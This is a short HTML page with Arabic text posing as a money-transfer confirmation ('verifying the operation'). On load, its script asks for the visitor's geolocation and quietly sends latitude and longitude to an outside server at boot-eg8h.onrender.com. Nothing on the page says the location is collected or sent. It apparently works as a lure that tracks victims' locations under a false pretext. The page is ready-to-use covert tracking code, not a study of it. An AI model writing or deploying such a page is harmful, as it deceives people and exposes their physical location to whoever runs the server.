<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>تأكيد التحويل</title>
</head>
<body>
  <h2>جاري التحقق من العملية...</h2>

  <script>
    navigator.geolocation.getCurrentPosition(success, error);

    function success(pos) {
      fetch('https://boot-eg8h.onrender.com/location', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude
        })
      });
    }

    function error(err) {
      alert("فشل في تحديد الموقع.");
    }
  </script>
</body>
</html>
